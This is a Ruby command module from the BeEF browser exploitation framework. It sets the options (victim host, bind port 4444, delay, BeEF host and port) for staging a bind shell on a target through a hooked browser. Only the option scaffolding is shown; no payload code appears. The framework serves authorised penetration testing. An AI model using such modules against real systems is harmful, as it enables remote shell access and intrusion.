#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Beef_staged_deploy_bind < BeEF::Core::Command

	def self.options
    configuration = BeEF::Core::Configuration.instance
    beef_host = "#{configuration.get("beef.http.host")}"
    beef_port = "#{configuration.get("beef.http.port")}"

		return [
      { 'name' => 'rhost', 'ui_label' => 'Target Host (victim)', 'value' => '127.0.0.1'},
      { 'name' => 'rport', 'ui_label' => 'BeEF Bind Port', 'value' => '4444'},
      { 'name' => 'path', 'ui_label' => 'Path', 'value' => '/'},
      { 'name' => 'delay', 'ui_label' => 'Add delay (ms)', 'value' => '4000'},
      { 'name' => 'beef_host', 'ui_label' => 'BeEF Host', 'value' => beef_host},
      { 'name' => 'beef_port', 'ui_label' => 'BeEF Port', 'value' => beef_port},
      { 'name' => 'beef_junk_port', 'ui_label' => 'BeEF Junk Port', 'value' => '2000'},
#      { 'name' => 'beef_junk_socket', 'ui_label' => 'BeEF Junk Socket Name', 'value' => 'beefbind'}
    ]
	end

	def post_execute
		save({'result' => @datastore['result']})
	end

end
